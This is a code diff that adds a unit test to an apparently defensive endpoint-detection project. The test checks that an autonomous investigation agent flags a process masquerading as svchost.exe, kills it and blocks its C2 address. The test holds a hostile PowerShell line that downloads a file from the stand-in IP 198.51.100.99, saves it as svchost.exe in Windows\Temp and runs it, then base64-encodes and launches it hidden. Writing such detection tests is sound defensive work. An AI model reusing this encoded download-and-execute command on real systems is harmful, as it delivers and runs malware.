@@ -4,7 +4,11 @@ using System.IO;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using Phalanx.Cockpit.Agent;
+using Phalanx.Cockpit.CQRS;
+using Phalanx.Cockpit.Storage;
 using Phalanx.Cockpit.Tools;
+using Phalanx.Shared.Protos;
 using Xunit;
 
 namespace Phalanx.Agent.Tests;
@@ -260,5 +264,92 @@ public class FileInspectionToolTests
         var afterClear = await _tool.ExecuteAsync(new() { ["filePath"] = mockPath });
         Assert.True(afterClear.Success);
         Assert.False((bool)afterClear.Data!["Exists"]);
+    }
+
+    [Fact]
+    [Trait("Category", "Unit")]
+    public async Task TestConvolutedEvasiveAttack_WithFileInspectionTool_ImmediateMasqueradingDetectionAndKill()
+    {
+        // 1. Arrange: 복합 회피 공격 (미등록 IP 198.51.100.99 + C:\Windows\Temp\svchost.exe 위장 드롭)
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool(),
+            new FileInspectionTool()
+        };
+
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
+
+        string targetFilePath = @"C:\Windows\Temp\svchost.exe";
+        FileInspectionTool.RegisterSimulatedFile(targetFilePath, new FileInspectionTool.SimulatedFileEntry(
+            Exists: true,
+            FileSizeBytes: 124928L,
+            Sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            Entropy: 7.4521,
+            IsSigned: false,
+            SignerSubject: string.Empty,
+            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
+            IsPathMasqueraded: true,
+            IsDisguisedExecutable: false,
+            AnomalyScore: 100,
+            DiagnosticReason: "시스템 핵심 바이너리 파일명이 비인가 디렉터리(Temp)에 위치하며 유효한 Microsoft 서명이 결여됨 (T1036.005 Masquerading)"
+        ));
+
+        try
+        {
+            // 부모: explorer.exe (정상 윈도우 셸)
+            treeManager.ApplySnapshotBatch(new[]
+            {
+                new ProcessEvent
+                {
+                    ProcessId = 5001,
+                    ImageName = "explorer.exe",
+                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
+                }
+            });
+
+            // 타깃: powershell.exe -w hidden -enc <미등록 IP 198.51.100.99로부터 update.dat를 받아 C:\Windows\Temp\svchost.exe로 저장 및 실행>
+            string evasiveScript = "$u='http://198.51.100.99/update.dat'; $p='C:\\Windows\\Temp\\svchost.exe'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
+            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(evasiveScript));
+            string fullCmd = $"powershell.exe -w hidden -enc {b64}";
+
+            treeManager.ApplyDeltaEvent(new ProcessEvent
+            {
+                ProcessId = 5002,
+                ParentProcessId = 5001,
+                ImageName = "powershell.exe",
+                CommandLine = fullCmd,
+                IsSuspended = true,
+                Lifecycle = ProcessLifecycle.LifecycleSuspended
+            });
+
+            var targetNode = treeManager.FindActiveNodeByPid(5002);
+            Assert.NotNull(targetNode);
+
+            // 2. Act: 자율 수사관 실행
+            var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
+
+            // 3. Assert: 즉각적인 Masquerading 탐지 및 ACTION_KILL 판결 검증
+            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
+            Assert.Contains("Masquerading", res.SummaryTitle, StringComparison.OrdinalIgnoreCase);
+            Assert.Contains("T1036.005", res.MitreTactics);
+
+            // FileInspectionTool이 수사 루프에 개입하여 위장을 포착했는지 검증
+            var fileInspectionTrace = res.Traces.Find(t => t.ActionTool == "FileInspectionTool");
+            Assert.NotNull(fileInspectionTrace);
+            Assert.Contains("T1036.005", fileInspectionTrace.Observation);
+
+            // 악성 C2 IP 방화벽 차단 연계 검증
+            Assert.Equal("198.51.100.99", res.BlockedIp);
+        }
+        finally
+        {
+            FileInspectionTool.ClearSimulatedFiles();
+        }
     }
 }
